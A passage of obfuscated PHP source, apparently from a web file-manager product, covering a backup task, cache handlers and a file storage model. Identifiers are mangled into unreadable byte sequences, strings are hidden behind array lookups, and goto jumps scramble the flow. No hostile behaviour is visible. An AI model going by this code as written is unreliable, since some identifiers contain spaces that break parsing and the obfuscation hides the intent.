$E¼±àòŠÅ += $Bøù®¡²†Ï[$_SERVER[³‘’¼äÑ™ÔÍ][77]]; $CœŞí‰»º += 1; $Dö×„œ›¼Å += $Bøù®¡²†Ï[$_SERVER[³‘’¼äÑ™ÔÍ][77]]; goto e÷ïÕ†´ÏÏ; FåËËÓÆî‚: } $eÙÅ™§ø = count($d“õë˜òÙ); $C‹–¯æáÂ¼++; } while ($eÙÅ™§ø == $eæÄ½ù‹³‚); $bõ”®›Á->end(); goto F‡±½ÃèµŒ; BÎØàÕÓœİ: $bõ”®›Á->task[$_SERVER[³‘’¼äÑ™ÔÍ][701]] = $cÜ›¾Õ‡’Ì; $E°‘ë«ŒÙ˜ = array($_SERVER[³‘’¼äÑ™ÔÍ][742] => $EŒÛÏ‰¤Õ…, $_SERVER[³‘’¼äÑ™ÔÍ][743] => $cÜ›¾Õ‡’Ì); Backup::set($E°‘ë«ŒÙ˜); goto B¢“ãŸïİÉ; cåÒÈ“ôßè: $eæÄ½ù‹³‚ = 1000; $E¼±àòŠÅ = $f¢²Ã²Â = 0; $fŒ‡áŞ”õê = array(); goto D‰©¶ëÃß; FÆê¼¨¹Ïò: $EŒÛÏ‰¤Õ… = (int) Model($_SERVER[³‘’¼äÑ™ÔÍ][722])->where($c¸ÏÜ¯œŒÆ)->count($_SERVER[³‘’¼äÑ™ÔÍ][419]); $cÜ›¾Õ‡’Ì = (int) Model($_SERVER[³‘’¼äÑ™ÔÍ][722])->where($c¸ÏÜ¯œŒÆ)->sum($_SERVER[³‘’¼äÑ™ÔÍ][77]); $bõ”®›Á = new TaskFileTransfer($_SERVER[³‘’¼äÑ™ÔÍ][740], $_SERVER[³‘’¼äÑ™ÔÍ][717], $EŒÛÏ‰¤Õ…, LNG($_SERVER[³‘’¼äÑ™ÔÍ][718]) . $_SERVER[³‘’¼äÑ™ÔÍ][719] . LNG($_SERVER[³‘’¼äÑ™ÔÍ][741])); goto BÎØàÕÓœİ; CÒ‹Ÿîåù‹: Backup::set($E°‘ë«ŒÙ˜); $this->_fileFilter($fŒ‡áŞ”õê); return !0; goto EÈã¿ìãâ¶; EÈã¿ìãâ¶: } private function _fileExist($B×¾ÔÂ¢, &$CÖá™ˆ±–, $f³¼Â¹ùíã) { goto e˜š·—–±È; E‰È…ºÃá: if (IO::exist($A‚ÍÅ­ª›¨)) { $CÖá™ˆ±–[] = $B×¾ÔÂ¢[$FšÎªìî[419]]; return !1; } $C£áöÔïâÚ = array($FšÎªìî[747] => $B×¾ÔÂ¢[$FšÎªìî[747]], $FšÎªìî[75] => array($FšÎªìî[755], "{$A‚ÍÅ­ª›¨}\45")); $cÌÕ‘ßÅİ„ = Model($FšÎªìî[722])->where($C£áöÔïâÚ)->field($FšÎªìî[420])->select(); goto E‡®‹Í®æÒ; FŒˆ„ÈºÂ: if (!in_array($B×¾ÔÂ¢[$FšÎªìî[747]], $f³¼Â¹ùíã)) { return !1; } if (IO::exist($e‹Æ–“Æ¹†)) { return !0; } $A‚ÍÅ­ª›¨ = get_path_father($e‹Æ–“Æ¹†); goto E‰È…ºÃá; e˜š·—–±È: $FšÎªìî =& $_SERVER[³‘’¼äÑ™ÔÍ]; $e‹Æ–“Æ¹† = $B×¾ÔÂ¢[$FšÎªìî[75]]; if (in_array($B×¾ÔÂ¢[$FšÎªìî[419]], $CÖá™ˆ±–)) { return !1; } goto FŒˆ„ÈºÂ; E‡®‹Í®æÒ: $CÖá™ˆ±– = array_merge($CÖá™ˆ±–, array_to_keyvalue($cÌÕ‘ßÅİ„, $FšÎªìî[33], $FšÎªìî[419])); return !1; goto c²ì‚Êª¥å; c²ì‚Êª¥å: } private function _fileFilter($B¬Œ¤ÆÂÉ) { $Dœ’¹‡‹ÁÁ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (empty($B¬Œ¤ÆÂÉ)) { return; } $e°ºšÜÙÎö = array($Dœ’¹‡‹ÁÁ[419] => array($Dœ’¹‡‹ÁÁ[7], array_unique($B¬Œ¤ÆÂÉ))); $C¢ˆ…ë‚·¥ = Model($Dœ’¹‡‹ÁÁ[756])->where($e°ºšÜÙÎö)->field($Dœ’¹‡‹ÁÁ[369])->select(); foreach ($C¢ˆ…ë‚·¥ as $eéİ›±Ã) { Model($Dœ’¹‡‹ÁÁ[756])->remove($eéİ›±Ã[$Dœ’¹‡‹ÁÁ[369]], !1); } } private function storeIds() { $f×‹õ™â† =& $_SERVER[³‘’¼äÑ™ÔÍ]; $cŒåÎ·ÂôÅ = Model($f×‹õ™â†[707])->listData(); $b‚ÙàŸêÉ = array(); $EÍÌ¾ÇÜ = $GLOBALS[$f×‹õ™â†[6]][$f×‹õ™â†[84]][$f×‹õ™â†[757]]; foreach ($cŒåÎ·ÂôÅ as $BïäìÛ”Âæ) { $EÜ‘àÒğ÷¤ = strtolower($BïäìÛ”Âæ[$f×‹õ™â†[90]]); if (!isset($EÍÌ¾ÇÜ[$EÜ‘àÒğ÷¤])) { continue; } $f…‹•âĞÓ = $f×‹õ™â†[71] . (isset($EÍÌ¾ÇÜ[$EÜ‘àÒğ÷¤]) ? $EÍÌ¾ÇÜ[$EÜ‘àÒğ÷¤] : ucfirst($EÜ‘àÒğ÷¤)); if (!class_exists($f…‹•âĞÓ)) { continue; } $b‚ÙàŸêÉ[] = $BïäìÛ”Âæ[$f×‹õ™â†[367]]; } return $b‚ÙàŸêÉ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto a¹çŒÙâÄ; DÕæ„ŸÈí—: switch ($C‡­óòº³™[$F‘†ğ·Æ[758]]) { case $F‘†ğ·Æ[17]: self::$handle = Model($F‘†ğ·Æ[760]); break; case $F‘†ğ·Æ[761]: self::$handle = new CacheRedis($Cë‚³ËòˆË, $aÂ®½›ó”Æ); break; case $F‘†ğ·Æ[762]: self::$handle = new CacheMemcached($Cë‚³ËòˆË, $aÂ®½›ó”Æ); break; case $F‘†ğ·Æ[167]: self::$handle = new CacheFile($Cë‚³ËòˆË, $aÂ®½›ó”Æ); break; default: break; } return self::$handle; goto EÁ‘› Ú; a¹çŒÙâÄ: $F‘†ğ·Æ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto d›‘ìëï¬É; d›‘ìëï¬É: $C‡­óòº³™ = $GLOBALS[$F‘†ğ·Æ[6]][$F‘†ğ·Æ[337]]; $Cë‚³ËòˆË = $C‡­óòº³™[$C‡­óòº³™[$F‘†ğ·Æ[758]]]; $aÂ®½›ó”Æ = $C‡­óòº³™[$F‘†ğ·Æ[759]]; goto DÕæ„ŸÈí—; EÁ‘› Ú: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($a¬™¹ÖÕ×©) { if (is_array($a¬™¹ÖÕ×©) || is_object($a¬™¹ÖÕ×©)) { $a¬™¹ÖÕ×© = json_encode($a¬™¹ÖÕ×©); } $a¬™¹ÖÕ×© = rawurlencode($a¬™¹ÖÕ×©); return KOD_SITE_ID . $_SERVER[³‘’¼äÑ™ÔÍ][70] . $a¬™¹ÖÕ×©; } public static function get($b³¥šİ) { $bí¨¦õâ÷¸ = self::key($b³¥šİ); if (!isset(self::$memoryCache[$bí¨¦õâ÷¸])) { $EØ‘ë­·ç = self::init()->get($bí¨¦õâ÷¸); self::$memoryCache[$bí¨¦õâ÷¸] = unserialize($EØ‘ë­·ç); } return self::$memoryCache[$bí¨¦õâ÷¸]; } public static function set($b¾ŠÜÚª·À, $CË–°°Ú’â, $Bàæ¹Æ ¨Ó = false) { goto b×Éº®©²; D…—Ú™Ü©³: CacheLock::lock($b¾ŠÜÚª·À); $c”¨¥ÇÕí = self::init()->set($eÀ™ƒ¾½×œ, serialize($CË–°°Ú’â), $Bàæ¹Æ ¨Ó); self::$memoryCache[$eÀ™ƒ¾½×œ] = $CË–°°Ú’â; goto BâÂŸ×öÌå; BâÂŸ×öÌå: CacheLock::unlock($b¾ŠÜÚª·À); return $c”¨¥ÇÕí; goto BËğ‹Äôë; b×Éº®©²: $eÀ™ƒ¾½×œ = self::key($b¾ŠÜÚª·À); if (isset(self::$memoryCache[$eÀ™ƒ¾½×œ]) && self::$memoryCache[$eÀ™ƒ¾½×œ] === $CË–°°Ú’â) { return !0; } if ($Bàæ¹Æ ¨Ó === 0) { self::$memoryCache[$eÀ™ƒ¾½×œ] = $CË–°°Ú’â; return !0; } goto D…—Ú™Ü©³; BËğ‹Äôë: } public static function remove($D°ˆÌİ‰Ö) { goto AÒˆºùœÊ¬; cøº ÑĞô‰: return $bÅäÖÈë¥í; goto dõß¼‰ª‹¸; AÒˆºùœÊ¬: $f‚”¬—Ãä = self::key($D°ˆÌİ‰Ö); unset(self::$memoryCache[$f‚”¬—Ãä]); self::clearTimeout(); goto C—«ÖËç¢‰; C—«ÖËç¢‰: CacheLock::lock($D°ˆÌİ‰Ö); $bÅäÖÈë¥í = self::init()->remove($f‚”¬—Ãä); CacheLock::unlock($D°ˆÌİ‰Ö); goto cøº ÑĞô‰; dõß¼‰ª‹¸: } public static function clearMemory($F ë×‡³çÊ = false) { if ($F ë×‡³çÊ) { $F ë×‡³çÊ = self::key($F ë×‡³çÊ); unset(self::$memoryCache[$F ë×‡³çÊ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[³‘’¼äÑ™ÔÍ][763])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[³‘’¼äÑ™ÔÍ][764])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($c‡¿ÚøºÄœ, $A·ÚáÄÄ‰İ) { $D…ˆ˜ŞÂÉ¬ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->cachePath = $c‡¿ÚøºÄœ[$D…ˆ˜ŞÂÉ¬[75]]; $this->prefix = $D…ˆ˜ŞÂÉ¬[765]; $this->cacheTime = $A·ÚáÄÄ‰İ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($b–‹ÃÖÇ‹‡) { $E•ÏŸ„·å¨ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $b–‹ÃÖÇ‹‡ = str_replace(array($E•ÏŸ„·å¨[766], $E•ÏŸ„·å¨[93], $E•ÏŸ„·å¨[69]), $E•ÏŸ„·å¨[767], $b–‹ÃÖÇ‹‡); return $this->cachePath . $E•ÏŸ„·å¨[768] . $b–‹ÃÖÇ‹‡ . $E•ÏŸ„·å¨[769]; } public function set($EÅîé¹îÁø, $ağ£™ÒÏİ…, $F´ÈŸå¼©  = false) { $B–Òƒè“´ = $this->getFile($EÅîé¹îÁø); if (file_put_contents($B–Òƒè“´, $this->prefix . $ağ£™ÒÏİ…, LOCK_EX)) { return !0; } @unlink($B–Òƒè“´); return !1; } public function get($Aêˆíõ­ˆ) { $eÏÂÖ„Œ°° = $this->getFile($Aêˆíõ­ˆ); if (file_exists($eÏÂÖ„Œ°°) && filemtime($eÏÂÖ„Œ°°) < time() - $this->cacheTime) { @unlink($eÏÂÖ„Œ°°); return !1; } $d¾ĞÈ³óáÜ = @file_get_contents($eÏÂÖ„Œ°°); return substr($d¾ĞÈ³óáÜ, strlen($this->prefix)); } public function remove($c ®ïÓèÀ²) { $b³ßˆÂ = $this->getFile($c ®ïÓèÀ²); return @unlink($b³ßˆÂ); } public function deleteAll() { $b·›¾„Û‘¸ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eñªñ¦›œ¯ = scandir($this->cachePath); foreach ($eñªñ¦›œ¯ as $C•è‹ƒ‰µ‹) { $fóùÇ‘ñìÛ = $this->cachePath . $C•è‹ƒ‰µ‹; if (strpos($fóùÇ‘ñìÛ, $b·›¾„Û‘¸[769]) && strpos($fóùÇ‘ñìÛ, $b·›¾„Û‘¸[770])) { @unlink($fóùÇ‘ñìÛ); } } } public function clearTimeout() { $A­…ÊòŠ¨ê =& $_SERVER[³‘’¼äÑ™ÔÍ]; $dØÄˆ‰§¿à = scandir($this->cachePath); foreach ($dØÄˆ‰§¿à as $eêŞ¾é§„Š) { $bÖËä¡‡“ = $this->cachePath . $eêŞ¾é§„Š; if (strpos($bÖËä¡‡“, $A­…ÊòŠ¨ê[769]) && strpos($bÖËä¡‡“, $A­…ÊòŠ¨ê[770]) && filemtime($bÖËä¡‡“) < time() - $this->cacheTime) { @unlink($bÖËä¡‡“); } } } } goto e‡Åê‰Œ; A×Š´ğƒ³å: class FileModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\146\151\x6c\x65"; protected $tableMeta = array("\164\x61\142\154\x65\116\x61\155\x65" => "\151\157\x5f\146\x69\x6c\145\x5f\155\145\x74\141", "\155\x65\x74\x61\x46\151\x65\x6c\144" => "\146\x69\154\145\111\104"); public function fileInfo($cê–Æñ§Š) { $bÁÃôÓâ¼ğ =& $_SERVER[³‘’¼äÑ™ÔÍ]; static $A¬›À—•×ß = array(); if (!isset($A¬›À—•×ß[$cê–Æñ§Š])) { $cÃŸ¥óø±ê = $bÁÃôÓâ¼ğ[2155]; $a¤³¨Œ°ñ÷ = Model($bÁÃôÓâ¼ğ[422])->field($cÃŸ¥óø±ê)->where(array($bÁÃôÓâ¼ğ[420] => $cê–Æñ§Š))->find(); $A¬›À—•×ß[$cê–Æñ§Š] = $a¤³¨Œ°ñ÷; } return $A¬›À—•×ß[$cê–Æñ§Š]; } public function addFileByContent($Fõ¥â„§Îß = '', $F¯µ»İ†Ó‡ = '') { goto bÌÙêÖÁÀ¼; c¤î£¥“„½: $Eµ’™°¥Ö = $cğÜ•×¤ùî . $AËÀ°ÇŞô“[2157] . rand_string(16); file_put_contents($Eµ’™°¥Ö, $Fõ¥â„§Îß); $dÕºÂ­È…‹ = $this->addFile($Eµ’™°¥Ö, $F¯µ»İ†Ó‡, !0); goto dÌƒ™ºõÄá; dÌƒ™ºõÄá: if (file_exists($Eµ’™°¥Ö)) { @unlink($Eµ’™°¥Ö); } return $dÕºÂ­È…‹; goto FÜ¤êÒ‚Šë; bÌÙêÖÁÀ¼: $AËÀ°ÇŞô“ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $cğÜ•×¤ùî = TEMP_PATH . $AËÀ°ÇŞô“[2156]; if (!is_dir($cğÜ•×¤ùî)) { mk_dir($cğÜ•×¤ùî); } goto c¤î£¥“„½; FÜ¤êÒ‚Šë: } public function createFileName($e‹‰±Ÿó¼ó) { goto A¥øğ«ŠÙ; E¤¾’åŞğ: $b•©äÅ¥‹Ã = $e©âõÛ¬½->pathFather($A­ë‹Í‚›); static $E…áƒĞ÷ñ = false; $EŒ·„ùºí£ = $e„Â•›‚Ş[2158] . md5($b•©äÅ¥‹Ã); goto DÛ‚„“é†˜; DÛ‚„“é†˜: if (!$E…áƒĞ÷ñ && !Cache::get($EŒ·„ùºí£)) { $E…áƒĞ÷ñ = !0; $bá¶—ù„Áì = IO::mkdir($b•©äÅ¥‹Ã); if (!IO::exist($bá¶—ù„Áì . $e„Â•›‚Ş[2159])) { IO::mkfile($bá¶—ù„Áì . $e„Â•›‚Ş[2159]); } Cache::set($EŒ·„ùºí£, 1, 3600 * 2); } return $A­ë‹Í‚›; goto C¯›èàö¤Æ; A¥øğ«ŠÙ: $e„Â•›‚Ş =& $_SERVER[³‘’¼äÑ™ÔÍ]; $e©âõÛ¬½ = IO::init($e„Â•›‚Ş[8]); $A­ë‹Í‚› = $this->makeFilePath($e‹‰±Ÿó¼ó, $e©âõÛ¬½); goto E¤¾’åŞğ; C¯›èàö¤Æ: } public function makeFilePath($c¢Ã–ë×Ú«, $Eß«ôœ³ Ø) { goto b¸’†…¼·Ï; EµŞÃÜë¢: switch ($fÈ¥ËÊóÎâ) { case $CŒõÇé‰£æ[2163]: $bàÒƒ¯Ÿæ = $bàÒƒ¯Ÿæ . $CŒõÇé‰£æ[91] . $Eß«ôœ³ Ø->ext($c¢Ã–ë×Ú«); if ($Eß«ôœ³ Ø->ext($c¢Ã–ë×Ú«) == $CŒõÇé‰£æ[2103]) { $bàÒƒ¯Ÿæ .= $CŒõÇé‰£æ[2164]; } break; case $CŒõÇé‰£æ[2165]: goto DË½ˆĞë¿î; BêìÒùÊÄ: break; goto BÕ£×÷†ªõ; C­ñ¿§ÑÀó: if ($Eß«ôœ³ Ø->ext($c¢Ã–ë×Ú«) == $CŒõÇé‰£æ[2103]) { $c¢Ã–ë×Ú« .= $CŒõÇé‰£æ[2164]; } $Cêö „Ç¸Ó = IO::fileNameAuto($fêÅŸĞˆ™ö, $c¢Ã–ë×Ú«); $bàÒƒ¯Ÿæ = $fêÅŸĞˆ™ö . $Cêö „Ç¸Ó; goto BêìÒùÊÄ; DË½ˆĞë¿î: $fàéø¾ñ™Ì = Model($CŒõÇé‰£æ[1092])->get($CŒõÇé‰£æ[1344]); $BŠÕ“„ô‹… = substr(md5($CŒõÇé‰£æ[1922] . $fàéø¾ñ™Ì . date($CŒõÇé‰£æ[690])), 0, 8); $fêÅŸĞˆ™ö = KodIO::defaultIO() . date($CŒõÇé‰£æ[2166]) . $BŠÕ“„ô‹… . $CŒõÇé‰£æ[8]; goto C­ñ¿§ÑÀó; BÕ£×÷†ªõ: case $CŒõÇé‰£æ[2162]: break; default: break; } return $bàÒƒ¯Ÿæ; goto añ…—£‘¦; CÄ×Š¿Î–ï: $bàÒƒ¯Ÿæ = $fêÅŸĞˆ™ö . rand_string(5) . short_id(100); $c¢Ã–ë×Ú« = str_replace($CŒõÇé‰£æ[8], $CŒõÇé‰£æ[70], KodIO::clear($c¢Ã–ë×Ú«)); if (!$c¢Ã–ë×Ú«) { $fÈ¥ËÊóÎâ = $CŒõÇé‰£æ[2162]; } goto EµŞÃÜë¢; b¸’†…¼·Ï: $CŒõÇé‰£æ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fÈ¥ËÊóÎâ = Model($CŒõÇé‰£æ[1092])->get($CŒõÇé‰£æ[2160]); $fêÅŸĞˆ™ö = KodIO::defaultIO() . date($CŒõÇé‰£æ[2161]); goto CÄ×Š¿Î–ï; añ…—£‘¦: } public function addFileByRemote($dÅØÇ¬ ’‚, $Eèßòàè£Ù, $EÆÈŠƒô·÷ = array()) { goto fêÁ²‹ƒ‹; BÛÎ—¯œÒÁ: if ($C¶î…›Ä¹‰ = $this->addFileCheckExist($f«“ÃÁ¸§[$eâ„øÁ¯ø[164]], $f«“ÃÁ¸§[$eâ„øÁ¯ø[163]], $f«“ÃÁ¸§[$eâ„øÁ¯ø[77]])) { return $C¶î…›Ä¹‰; } return $this->addFileData($f«“ÃÁ¸§); goto Aâ›¨±¯ÓÀ; fêÁ²‹ƒ‹: $eâ„øÁ¯ø =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!IO::exist($dÅØÇ¬ ’‚)) { return !1; } $e¿¡‘¼•÷„ = $EÆÈŠƒô·÷[$eâ„øÁ¯ø[163]] ? $EÆÈŠƒô·÷[$eâ„øÁ¯ø[163]] : $eâ„øÁ¯ø[33]; goto b½¹šÇÅÏ°; b½¹šÇÅÏ°: $Bëâ×ŠƒÜØ = IO::hashMd5($dÅØÇ¬ ’‚, $e¿¡‘¼•÷„); $b™¯Á…ã = KodIO::defaultDriver(); $f«“ÃÁ¸§ = array($eâ„øÁ¯ø[520] => IO::size($dÅØÇ¬ ’‚), $eâ„øÁ¯ø[2167] => 1, $eâ„øÁ¯ø[386] => $Eèßòàè£Ù, $eâ„øÁ¯ø[739] => $b™¯Á…ã[$eâ„øÁ¯ø[367]], $eâ„øÁ¯ø[387] => $dÅØÇ¬ ’‚, $eâ„øÁ¯ø[2168] => $EÆÈŠƒô·÷[$eâ„øÁ¯ø[164]] ? $EÆÈŠƒô·÷[$eâ„øÁ¯ø[164]] : IO::hashSimple($dÅØÇ¬ ’‚), $eâ„øÁ¯ø[2169] => $Bëâ×ŠƒÜØ ? $Bëâ×ŠƒÜØ : $e¿¡‘¼•÷„); goto BÛÎ—¯œÒÁ; Aâ›¨±¯ÓÀ: } private function addFileData($d­è¹óŒ„ª) { $FóìŠÛùºä =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$d­è¹óŒ„ª) { return !1; } $d­è¹óŒ„ª[$FóìŠÛùºä[77]] = intval($d­è¹óŒ„ª[$FóìŠÛùºä[77]]); if (!$d­è¹óŒ„ª[$FóìŠÛùºä[77]] && strlen($d­è¹óŒ„ª[$FóìŠÛùºä[164]]) > 32) { $d­è¹óŒ„ª[$FóìŠÛùºä[77]] = intval(substr($d­è¹óŒ„ª[$FóìŠÛùºä[164]], 32)); } $bñÉ÷®ÃŞ = $this->add($d­è¹óŒ„ª); return $this->find($bñÉ÷®ÃŞ); } public function addFile($EÑØåç”¹†, $D¾­Š¡©Ñ, $Fçˆ¡‰¬Â = false) { $cì¤¶¯Ô = IO::hashSimple($EÑØåç”¹†); $b¾›Ì»Âø³ = IO::hashMd5($EÑØåç”¹†); $EÁ£Õ™‚ñ© = IO::size($EÑØåç”¹†); if ($FÓŞƒĞ»Œ = $this->addFileCheckExist($cì¤¶¯Ô, $b¾›Ì»Âø³, $EÁ£Õ™‚ñ©)) { return $FÓŞƒĞ»Œ; } $B•Íïäƒ¹ä = $this->addFileMake($EÑØåç”¹†, $EÁ£Õ™‚ñ©, $cì¤¶¯Ô, $b¾›Ì»Âø³, $D¾­Š¡©Ñ, $Fçˆ¡‰¬Â); return $this->addFileData($B•Íïäƒ¹ä); } public function addFileMake($EÒŒê÷ÒÊ, $c’¤ì¾ïìŸ, $E‹Ì˜µù¤, $DÎéîÒßóÆ, $C‘ä™ÅƒÙ›, $fŠÃ‚Öé¢) { goto D¼±ÁùóÕæ; c«¬º©‹ÃÜ: $c»††É¸´© = KodIO::defaultDriver(); $D˜À¡•£Â› = array($E›ïİİ¾òç[520] => $c’¤ì¾ïìŸ, $E›ïİİ¾òç[2167] => 1, $E›ïİİ¾òç[386] => $C‘ä™ÅƒÙ›, $E›ïİİ¾òç[739] => $c»††É¸´©[$E›ïİİ¾òç[367]], $E›ïİİ¾òç[387] => $a¥ÛÉ§ÆÇÌ, $E›ïİİ¾òç[2168] => $E‹Ì˜µù¤, $E›ïİİ¾òç[2169] => $DÎéîÒßóÆ); return $D˜À¡•£Â›; goto aœĞÁ›§Ú; D¼±ÁùóÕæ: $E›ïİİ¾òç =& $_SERVER[³‘’¼äÑ™ÔÍ]; $a¥ÛÉ§ÆÇÌ = $this->createFileName($C‘ä™ÅƒÙ›); $C¹¼¤«í„› = get_path_father($a¥ÛÉ§ÆÇÌ); goto f¬Ç‘¿×¥µ; f¬Ç‘¿×¥µ: $cĞğÄˆ‘ø¨ = get_path_this($a¥ÛÉ§ÆÇÌ); if ($fŠÃ‚Öé¢) { $C×Ê«ùˆÙ† = IO::move($EÒŒê÷ÒÊ, $C¹¼¤«í„›, !1, $cĞğÄˆ‘ø¨); } else { $C×Ê«ùˆÙ† = IO::copy($EÒŒê÷ÒÊ, $C¹¼¤«í„›, !1, $cĞğÄˆ‘ø¨); } if (!$C×Ê«ùˆÙ†) { return !1; } goto c«¬º©‹ÃÜ; aœĞÁ›§Ú: } public function addFileCheckExist($e¦Ù”œ‡ã…, $dÈ‡ÇÉŒíÍ, $F†â¼‡Áãâ) { $bÌ‰ì‘¡ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $b¿ÓŞÁµÜÛ = $this->findByHash($e¦Ù”œ‡ã…, $dÈ‡ÇÉŒíÍ); if (!$b¿ÓŞÁµÜÛ) { return !1; } $eö˜İÄß‰Ê = array($bÌ‰ì‘¡[2167] => intval($b¿ÓŞÁµÜÛ[$bÌ‰ì‘¡[2170]]) + 1, $bÌ‰ì‘¡[520] => $F†â¼‡Áãâ); $this->where(array($bÌ‰ì‘¡[420] => $b¿ÓŞÁµÜÛ[$bÌ‰ì‘¡[419]]))->save($eö˜İÄß‰Ê); return $b¿ÓŞÁµÜÛ; } public function remove($CÏòŸô‡—) { $this->linkCountChange($CÏòŸô‡—, !1); $this->clearEmpty(); return !0; } public function linkAdd($CÉ®‘áŞ«Õ) { $this->linkCountChange($CÉ®‘áŞ«Õ, !0); } public function linkCountChange($aµ×ùçĞµÔ, $B›¼Ò“™Ä) { goto E‚ÖŸóÕ·; E‚ÖŸóÕ·: $bšòá‘÷÷Ê =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$aµ×ùçĞµÔ) { return; } if (!is_array($aµ×ùçĞµÔ)) { $aµ×ùçĞµÔ = array($aµ×ùçĞµÔ); } goto c‹ëºõù•†; c‹ëºõù•†: $añ¤ƒÒŠ„µ = array(); foreach ($aµ×ùçĞµÔ as $B¤áÛâÇ›´) { $c•¥ñàëÄ’ = $B¤áÛâÇ›´ . $bšòá‘÷÷Ê[33]; if (!$añ¤ƒÒŠ„µ[$c•¥ñàëÄ’]) { $añ¤ƒÒŠ„µ[$c•¥ñàëÄ’] = 0; } $añ¤ƒÒŠ„µ[$c•¥ñàëÄ’]++; } $dî©‹áôÏÀ = array(); goto cø…â¿Ù°¦; cø…â¿Ù°¦: foreach ($añ¤ƒÒŠ„µ as $B¤áÛâÇ›´ => $b‚ê‡ó¨é) { $c•¥ñàëÄ’ = $b‚ê‡ó¨é . $bšòá‘÷÷Ê[33]; if (!$dî©‹áôÏÀ[$c•¥ñàëÄ’]) { $dî©‹áôÏÀ[$c•¥ñàëÄ’] = array(); } $dî©‹áôÏÀ[$c•¥ñàëÄ’][] = $B¤áÛâÇ›´; } foreach ($dî©‹áôÏÀ as $b‚ê‡ó¨é => $Cˆƒö®¼¿ä) { if (!$Cˆƒö®¼¿ä) { continue; } $b‚ê‡ó¨é = $B›¼Ò“™Ä ? $b‚ê‡ó¨é : -intval($b‚ê‡ó¨é); $eèä‘ÔÄ¹‚ = array($bšòá‘÷÷Ê[419] => array($bšòá‘÷÷Ê[7], $Cˆƒö®¼¿ä)); if ($b‚ê‡ó¨é < 0) { $eèä‘ÔÄ¹‚[$bšòá‘÷÷Ê[2170]] = array($bšòá‘÷÷Ê[933], abs($b‚ê‡ó¨é)); } $this->where($eèä‘ÔÄ¹‚)->setAdd($bšòá‘÷÷Ê[2170], $b‚ê‡ó¨é); } goto b¼„ƒÀ¶¥; b¼„ƒÀ¶¥: } public function findByHash($dá¹”¿È»±, $aåêßÈéŠğ = false) { $fÆŞ´¥ù¢¹ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$dá¹”¿È»± && !$aåêßÈéŠğ) { return !1; } $DÇ¹±ó õè = array($fÆŞ´¥ù¢¹[2168] => $dá¹”¿È»±); if ($aåêßÈéŠğ) { $DÇ¹±ó õè = array($fÆŞ´¥ù¢¹[2169] => $aåêßÈéŠğ); } return $this->order($fÆŞ´¥ù¢¹[2171])->where($DÇ¹±ó õè)->find(); } public function clearEmpty($Bôß¶Ùñø = 0) { goto BŒğÖ£“Õ‚; BŒğÖ£“Õ‚: $B…İ«§Ş‚˜ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $a‚ùêèÍ = time() - 3600 * 24 * $Bôß¶Ùñø; $c‹¼©Ï¾ = $B…İ«§Ş‚˜[2172] . $a‚ùêèÍ; goto fíÌ¤×‡Ø; fíÌ¤×‡Ø: $a‘¥¡¡Œª = $this->where($c‹¼©Ï¾)->select(); if (!$a‘¥¡¡Œª) { return; } $C‰ªÀÆöÚ¡ = new Task($B…İ«§Ş‚˜[2173], $B…İ«§Ş‚˜[33], count($a‘¥¡¡Œª)); goto aí¦Î‚À÷à; aí¦Î‚À÷à: foreach ($a‘¥¡¡Œª as $dÇ±°ˆÄ») { $C‰ªÀÆöÚ¡->update(1); $this->resetFile($dÇ±°ˆÄ»); } $C‰ªÀÆöÚ¡->end(); goto Eõ»ÈÉœÍ; Eõ»ÈÉœÍ: } private function resetFile($fîÉò®æíÏ) { goto c¸­¯‹£¯œ; F¤Œß«å: $d·ŠöÚ…Õ¥ = Model($A…¶¬ªÃçğ[2174])->where($bâÂç“ñœ)->count(); $bøŞÛ¶ò‰ƒ = intval($D…ˆ’Ô„´) + intval($d·ŠöÚ…Õ¥); if ($bøŞÛ¶ò‰ƒ == 0) { IO::remove($fîÉò®æíÏ[$A…¶¬ªÃçğ[75]]); $this->where($bâÂç“ñœ)->delete(); $this->metaSet($fîÉò®æíÏ[$A…¶¬ªÃçğ[419]], null, null); return; } goto bğ½òìÒÓ; bğ½òìÒÓ: if ($fîÉò®æíÏ[$A…¶¬ªÃçğ[2170]] != $bøŞÛ¶ò‰ƒ) { $this->where($bâÂç“ñœ)->save(array($A…¶¬ªÃçğ[2167] => $bøŞÛ¶ò‰ƒ)); } goto C‘ÇœÆåÒ; c¸­¯‹£¯œ: $A…¶¬ªÃçğ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bâÂç“ñœ = array($A…¶¬ªÃçğ[420] => $fîÉò®æíÏ[$A…¶¬ªÃçğ[419]]); $D…ˆ’Ô„´ = Model($A…¶¬ªÃçğ[1121])->where($bâÂç“ñœ)->count(); goto F¤Œß«å; C‘ÇœÆåÒ: } public function storageInfo($AïöøÌ”Ó = false) { goto dÕ‹ÒÃÄ—Ï; eÙ¢‘ÑÈæ: $a£¶ô¢İŒ = 1; $BªÇ¢¡§Ÿî = 0; $CÑõ¤ ï¥ = 5000; goto EìëŒƒà„Î; dÕ‹ÒÃÄ—Ï: $f™ĞÃ‘Ö› =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bÈÍ“—ŒÅ÷ = $this->count() + 0.0; $CÚå—ÉÛÀ¦ = 0; goto eÙ¢‘ÑÈæ; EìëŒƒà„Î: for ($f‹èî²¿¯‡ = 0; $f‹èî²¿¯‡ < $bÈÍ“—ŒÅ÷; $f‹èî²¿¯‡ = 